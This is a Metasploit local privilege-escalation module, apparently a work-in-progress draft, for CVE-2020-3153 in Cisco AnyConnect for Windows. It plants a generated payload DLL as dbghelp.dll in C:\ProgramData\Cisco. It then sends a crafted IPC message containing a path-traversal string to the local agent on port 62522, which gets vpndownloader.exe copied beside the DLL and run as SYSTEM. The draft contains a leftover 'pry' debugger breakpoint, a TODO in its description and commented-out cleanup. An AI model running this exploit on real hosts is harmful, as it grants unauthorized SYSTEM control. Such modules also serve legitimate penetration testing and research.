##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking


  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Services
  include Msf::Post::Windows::FileSystem



  # In-use:
  # include file_version
  include Msf::Post::Windows::FileInfo
  # includes file_exist?
  include Msf::Post::File
  # includes generate_payload_dll
  include Msf::Exploit::EXE
  # includes register_files_for_cleanup
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Cisco AnyConnect Priv Esc through Path Traversal',
        'Description' => %q{
        TODO:
        The update functionality of the Cisco AnyConnect Secure Mobility Client for Windows is affected by a path traversal vulnerability that allows local attackers to create/overwrite files in arbitrary locations. Successful exploitation of this vulnerability allows the attacker to gain SYSTEM privileges.
        },
        'License' => MSF_LICENSE,
        # The place to add your name/handle and email.  Twitter and other contact info isn't handled here.
        # Add reference to additional authors, like those creating original proof of concepts or
        # reference materials.
        # It is also common to comment in who did what (PoC vs metasploit module, etc)
        'Author' =>
          [
            'Yorick Koster', # original PoC, analysis
            'Antoine GOICHOT (ATGO)', # original PoC
            'Christophe De La Fuente' # msf module
          ],
        'Platform' => [ 'windows' ],
        'Arch' => [ ARCH_X86, ARCH_X64 ],
        # What types of sessions we can use this module in conjunction with.  Most modules use libraries
        # which work on shell and meterpreter, but there may be a nuance between one of them, so best to
        # test both to ensure compatibility.
        'SessionTypes' => [ 'shell', 'meterpreter' ],
        'Targets' => [[ 'Auto', {} ]],
        'Privileged' => true,
        'References' =>
          [
            [ 'Cisco Bug ID', 'CSCvs46327' ],
            [ 'URL', 'https://ssd-disclosure.com/ssd-advisory-cisco-anyconnect-privilege-elevation-through-path-traversal/'],
            [ 'URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-ac-win-path-traverse-qO4HWBsj'],
            [ 'CVE', '2020-3153']
          ],
        'DisclosureDate' => 'Feb 19 2020',
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'FileDropperDelay' => 10
        }
      )
    )

    register_advanced_options [
      OptBool.new('ForceExploit', [ false, 'Override check result', false ])
    ]

    @file_name = 'vpndownloader.exe'
  end

  # See AnyConnect IPC protocol articles:
  # - https://www.serializing.me/2016/12/14/anyconnect-elevation-of-privileges-part-1/
  # - https://www.serializing.me/2016/12/20/anyconnect-elevation-of-privileges-part-2/
  class CIPCHeader < BinData::Record
    endian :little

    uint32 :id_tag,            label: 'ID Tag', value: 0x4353434f
    uint16 :header_length,     label: 'Header Length', initial_value: -> { num_bytes }
    uint16 :data_length,       label: 'Data Length', initial_value: -> { parent.body.num_bytes }
    uint32 :ipc_repsonse_cb,   label: 'IPC response CB', initial_value: 0xFFFFFFFF
    uint32 :msg_user_context,  label: 'Message User Context', initial_value: 0x00000000
    uint32 :request_msg_id,    label: 'Request Message Id', initial_value: 0x00000002
    uint32 :return_ipc_object, label: 'Return IPC Object', initial_value: 0x00000000
    uint8  :message_type,      label: 'Message Type', initial_value: 1
    uint8  :message_id,        label: 'Message ID', initial_value: 2
  end

  class CIPCTlv < BinData::Record
    endian :big

    uint8   :msg_type,   label: 'Type'
    uint8   :msg_index,  label: 'Index'
    uint16  :msg_length, label: 'Length', initial_value: -> { msg_value.num_bytes }
    stringz :msg_value,  label: 'Value', length: -> { msg_length }
  end

  class CIPCMessage < BinData::Record
    endian :little

    cipc_header :header, label: 'Header'
    array :body, label: 'Body', type: :cipc_tlv, read_until: :eof
  end

  # Simplify pulling the writable directory variable
  #def base_dir
  #  datastore['WritableDir'].to_s
  #end

  def check
    fail_with(Failure::None, 'Session is already elevated') if is_system?

    file_path = nil
    path = 'Cisco\\Cisco AnyConnect Secure Mobility Client'
    [ 'C:\\Program Files (x86)', 'C:\\Program Files' ].each do |pf_path|
      if file_exist?([pf_path, path, @file_name].join('\\'))
        @installation_path = "#{pf_path}\\#{path}"
        file_path = "#{@installation_path}\\#{@file_name}"
        break
      end
    end

    if file_path
      vprint_status("Found vpndownloader.exe path: '#{file_path}'")
      version = file_version(file_path)
      if version
        patched_version = Gem::Version.new('4.8.02042')
        @ac_version    = Gem::Version.new(version.join('.'))
        if @ac_version < patched_version
          vprint_good("Cisco AnyConnect version #{@ac_version} appears to be vulnerable")
          return CheckCode::Appears
        else
          vprint_error("Cisco AnyConnect version #{@ac_version} is not vulnerable")
          return CheckCode::Safe
        end
      else
        vprint_warning('Unable to retrieve vpndownloader.exe file version')
      end
    else
      vprint_warning(
        'vpndownloader.exe not found on the file system, file version check '\
        'won\'t be possible'
      )
    end

    CheckCode::Unknown
  end

  def exploit
    if check == CheckCode::Safe
      unless datastore['ForceExploit']
        fail_with( Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.')
      end
      print_warning 'Target does not appear to be vulnerable'
    end

    cac_cmd = '"CAC-nc-install'
    if @ac_version >= Gem::Version.new('4.7')
      vprint_status('"-ipc" argument needed')
      cac_cmd << "\t-ipc=666"
    else
      vprint_status('"-ipc" argument not needed')
    end

    dbghelp_path = 'C:\\ProgramData\\Cisco\\dbghelp.dll'
    print_status("Writing the payload to #{dbghelp_path}")

    begin
      #:dll_exitprocess
      payload_dll = generate_payload_dll
      write_file(dbghelp_path, payload_dll)
      register_file_for_cleanup(dbghelp_path)
    rescue ::Rex::Post::Meterpreter::RequestError => e
      fail_with(Failure::NotFound, e.message)
    end

    # vpndownloader.exe will be copied to "C:\ProgramData\Cisco\" (assuming the
    # normal process will copy the file to
    # "C:\ProgramData\Cisco\Cisco AnyConnect Secure Mobility Client\Temp\Installer\XXXX.tmp\")
    register_file_for_cleanup("C:\\ProgramData\\Cisco\\#{@file_name}")
    cac_cmd << "\t#{@installation_path}\\nope\\nope\\nope\\nope\\../../../../#{@file_name}\t-\""
    vprint_status("RPC Command: #{cac_cmd}")

    cipc_msg = CIPCMessage.new
    cipc_msg.body << CIPCTlv.new(
      msg_type: 0,
      msg_index: 2,
      msg_value: cac_cmd
    )
    cipc_msg.body << CIPCTlv.new(
      msg_type: 0,
      msg_index: 6,
      msg_value: "#{@installation_path}\\#{@file_name}"
    )

    vprint_status('Connecting to the AnyConnect agent on 127.0.0.1:62522')
    socket = client.net.socket.create(
      Rex::Socket::Parameters.new(
        'PeerHost' => '127.0.0.1',
        'PeerPort' => 62522,
        'Proto'    => 'tcp'
      )
    )

    vprint_status("Send the encoded RPC command (size = #{cipc_msg.num_bytes} bytes)")
    socket.write(cipc_msg.to_binary_s)
    require 'pry';binding.pry

  #ensure
    #vprint_status("Close the socket")
    #socket.close if socket
  end

  #def on_new_session(session)
  #end

  #def cleanup
    # Shortcut Msf::Exploit::FileDropper#cleanup to make sure #on_new_session will run first to cleanup. Elevated privileges are required to delete vpndownloader.exe.
  #end
end
